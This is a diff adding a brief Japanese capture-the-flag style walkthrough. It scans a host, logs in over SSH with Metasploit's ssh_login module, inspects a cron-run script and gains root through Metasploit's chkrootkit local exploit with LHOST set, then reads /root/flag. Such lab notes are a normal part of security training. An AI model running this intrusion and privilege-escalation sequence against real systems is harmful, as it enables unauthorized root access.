@@ -1,0 +1,25 @@
+1) ping
+2) nmapでポートスキャンを行う
+3) msfconsoleを起動する
+4) クレデンシャルがある状態でのsshをログインする場合は、以下のコマンドを実行する
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS
+set USERNAME
+set PASSWORD
+exploit
+5) セッションを起動する
+sessions -i 1
+6) 以下のコマンドで実行中のサービスを確認する
+ps aux
+7) cronとbashのスクリプトを実行されていることを確認するために、チェックダウンbashスクリプトを調査する
+cat /bin/check-down
+実行されているものがわかったら、場所とバージョンを確認する
+command -v 実行されているもの
+/bin/実行されているもの -V
+8) searchsploit 実行されているもので、エクスプロイトを確認する
+9) フラグを取得する
+use exploit/unix/local/chkrootkit
+set CHKROOTKIT /bin/chkrootkit
+set LHOST
+exploit
+cat /root/flag
